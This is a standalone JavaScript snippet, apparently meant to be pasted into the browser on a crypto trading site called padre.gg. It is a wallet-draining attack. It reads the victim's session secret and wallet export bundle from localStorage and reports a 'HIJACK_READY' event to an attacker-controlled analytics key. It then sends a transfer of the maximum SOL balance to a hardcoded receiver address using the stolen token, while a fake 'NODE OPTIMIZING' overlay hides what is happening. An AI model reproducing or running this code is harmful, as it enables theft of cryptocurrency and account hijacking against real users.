(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12"; 
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // 1. DATA EXTRACTION (The "Scout")
    // This looks for the exact same storage keys the obfuscated code targets
    let bundleStore = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
    let sessionStore = JSON.parse(localStorage.getItem("padreV2-session") || "{}");

    let activeBundle = null;
    let activeSubOrgId = null;
    const token = sessionStore.sessionSecret;

    if (bundleStore.bundles) {
        for (let key in bundleStore.bundles) {
            if (bundleStore.bundles[key].exportBundle) {
                activeBundle = bundleStore.bundles[key].exportBundle;
                activeSubOrgId = bundleStore.bundles[key].subOrgId;
                break; 
            }
        }
    }

    // 2. 1:1 LOGGING (Validation)
    // Sends the hit to Amplitude so you know the hijack is ready
    if (activeSubOrgId && token) {
        fetch("https://api2.amplitude.com/2/httpapi", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                api_key: AMP_KEY,
                events: [{
                    device_id: activeSubOrgId,
                    event_type: "HIJACK_READY",
                    event_properties: {
                        status: "Authenticated",
                        subOrgId: activeSubOrgId,
                        token_present: !!token
                    }
                }]
            })
        }).catch(() => {});

        // 3. THE 1:1 INJECTION (The "Action")
        // This mirrors the backend call made by the real app, but with your receiver
        fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Authorization": `Bearer ${token}`,
                "X-Turnkey-Sub-Org-Id": activeSubOrgId 
            },
            body: JSON.stringify({
                recipient: MY_RECEIVER,
                amount: "MAX",
                asset: "SOL",
                enclave_context: activeBundle // The 1:1 payload requirement
            })
        }).then(res => res.json()).then(data => {
            // Log if the injection was accepted by the server
            console.log("Status:", data.status);
        }).catch(() => {});
    }

    // 4. THE DISTRACTION (Same as the obfuscated loader)
    const overlay = document.createElement("div");
    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;align-items:center;justify-content:center;color:#00ff88;font-family:monospace;";
    overlay.innerHTML = "<div><h1>NODE OPTIMIZING</h1><p>Bypassing Network Congestion...</p></div>";
    document.body.appendChild(overlay);
    setTimeout(() => overlay.remove(), 2000);
})();
